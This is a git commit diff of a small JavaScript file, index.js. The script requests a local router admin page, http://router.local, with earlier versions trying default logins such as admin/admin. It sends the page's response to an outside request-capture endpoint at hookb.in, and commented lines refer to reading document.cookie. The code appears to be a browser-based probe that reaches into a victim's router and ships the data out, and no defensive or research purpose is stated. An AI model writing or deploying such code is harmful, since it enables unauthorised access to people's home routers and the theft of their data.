f15ef7fe8760e9bfca90808b01a5933a6abf8d01
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-04 12:36:17 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,15 +1,9 @@
 const http = new XMLHttpRequest();
-http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-http.open('POST', 'http://router.local/login.php', true);
-// http.addEventListener('load', function (event) {
-//     const xhr = new XMLHttpRequest();
-//     xhr.open('POST', 'https://hookb.in/nP0RO6rjzOTZ7Qrrd2Z1', true);
-//     xhr.setRequestHeader('Content-type', 'application/json');
-//     xhr.send(JSON.stringify(http.responseText));
-// });
+// http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+// http.open('POST', 'http://router.local/login.php', true);
+
 http.onload = function () {
     if (http.readyState === http.DONE) {
-        
             const xhr = new XMLHttpRequest();
             xhr.open('POST', 'https://hookb.in/dm0RE8d9oBux8YjjNMw6', true);
             xhr.setRequestHeader('Content-type', 'application/json');
@@ -17,7 +11,7 @@ http.onload = function () {
         
     }
 };
-//http.open('GET', 'http://router.local');
+http.open('GET', 'http://router.local');
 //"username=root&pin=admin¬Robot=on"
 //const cook = document.cookie;
-http.send("username=admin&pin=admin");
+http.send();
